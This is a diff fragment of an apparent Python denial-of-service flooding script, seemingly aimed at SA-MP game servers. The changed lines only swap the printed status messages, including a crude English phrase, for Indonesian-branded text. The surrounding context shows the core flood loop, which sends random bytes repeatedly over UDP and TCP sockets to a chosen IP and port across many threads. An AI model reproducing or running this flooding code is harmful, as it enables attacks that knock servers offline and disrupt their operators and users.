@@ -67,9 +67,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \u001b[31mThread initiated|\u001b[35mSlamming %s:%s|\u001b[31mGetPieced Slapped that hoe"%(ip,port))
+			print(i +" \u001b[31mThreads To|\u001b[35mIP AND PORT %s:%s|\u001b[31mPackets XD3MP;SAMP Nuklir V4 Meluncur"%(ip,port))
 		except:
-			print("[ 1 ] Down!!!")
+			print("[ 1 ] Packets Dari XD3MP;SAMP Udh Berhenti!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -81,10 +81,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" \u001b[31mThread initiated|\u001b[35mSlamming %s:%s|\u001b[31mGetPieced Slapped that hoe"%(ip,port))
+			print(i +" \u001b[31mThreads To|\u001b[35mIP AND PORT %s:%s|\u001b[31mPackets XD3MP;SAMP Nuklir V4 Meluncur"%(ip,port))
 		except:
 			s.close()
-			print("[ 2 ] Down")
+			print("[ 2 ] Packets Dari XD3MP;SAMP Udh Berhenti!!!")
             
 for y in range(threads):
 	if choice == 'y':
